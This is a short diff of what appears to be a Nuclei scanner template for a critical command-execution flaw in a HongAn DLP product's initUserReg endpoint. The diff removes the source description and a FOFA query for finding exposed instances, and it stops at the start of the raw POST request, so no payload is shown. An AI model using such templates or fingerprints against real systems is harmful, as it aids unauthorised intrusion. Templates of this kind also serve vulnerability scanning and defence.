@@ -3,12 +3,8 @@ info:
   name: 虹安信息数据泄露防护平台initUserReg存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/givdrymbbypmg5y5'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: givdrymbbypmg5y5
-    fofa: product="HongAn-Heimdall-DLP" || body="userReg/initUserReg.do"
 http:
 - raw:
   - 'POST /dlp/userReg/initUserReg.do HTTP/1.1
